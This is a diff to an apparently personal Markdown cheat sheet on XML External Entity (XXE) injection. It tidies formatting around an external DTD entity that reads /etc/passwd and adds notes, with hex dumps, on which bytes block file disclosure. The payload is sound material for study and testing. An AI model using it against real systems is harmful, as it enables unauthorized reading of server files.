@@ -202,15 +202,17 @@ Note: It has to be defined before any XML document node begin. This means that w
           <first>I would like to say hello world</first>
           <second>I would like to say hello world again.</second>
       </sample>
-   ```
+      ```
    
-2. External definition**
+   
+   
+2. **External definition**
    
       External DTD file:
    
       ```dtd
    <!ENTITY callme SYSTEM "/etc/passwd">
-      ```
+   ```
 
       Definition:
    
@@ -232,6 +234,39 @@ Note: It has to be defined before any XML document node begin. This means that w
       <sample>&callme;</sample>
       ```
    
+
+### Observations
+
+XXE File content disclosure has some limitations in type of files that can be disclosed. If a file content contains any of illegal bad characters, the content cannot be retrieved. In such cases, the attacker would need to rely on techniques to encode the content before retrieval. The following characters were collected during after some fuzzing.
+
+**Illegal characters**
+
+```
+00000000: 0102 0304 0506 0708 0b0c 0e0f 1011 1213  ................
+00000010: 1415 1617 1819 1a1b 1c1d 1e1f 263c 8081  ............&<..
+00000020: 8283 8485 8687 8889 8a8b 8c8d 8e8f 9091  ................
+00000030: 9293 9495 9697 9899 9a9b 9c9d 9e9f a0a1  ................
+00000040: a2a3 a4a5 a6a7 a8a9 aaab acad aeaf b0b1  ................
+00000050: b2b3 b4b5 b6b7 b8b9 babb bcbd bebf c0c1  ................
+00000060: c2c3 c4c5 c6c7 c8c9 cacb cccd cecf d0d1  ................
+00000070: d2d3 d4d5 d6d7 d8d9 dadb dcdd dedf e0e1  ................
+00000080: e2e3 e4e5 e6e7 e8e9 eaeb eced eeef f0f1  ................
+00000090: f2f3 f4f5 f6f7 f8f9 fafb fcfd feff       ..............
+```
+
+**All safe characters**
+
+```
+00000000: 090a 0d20 2122 2324 2527 2829 2a2b 2c2d  ... !"#$%'()*+,-
+00000010: 2e2f 3031 3233 3435 3637 3839 3a3b 3d3e  ./0123456789:;=>
+00000020: 3f40 4142 4344 4546 4748 494a 4b4c 4d4e  ?@ABCDEFGHIJKLMN
+00000030: 4f50 5152 5354 5556 5758 595a 5b5c 5d5e  OPQRSTUVWXYZ[\]^
+00000040: 5f60 6162 6364 6566 6768 696a 6b6c 6d6e  _`abcdefghijklmn
+00000050: 6f70 7172 7374 7576 7778 797a 7b7c 7d7e  opqrstuvwxyz{|}~
+00000060: 7f                                       .
+```
+
+
 
 ## Great Works by Others
 
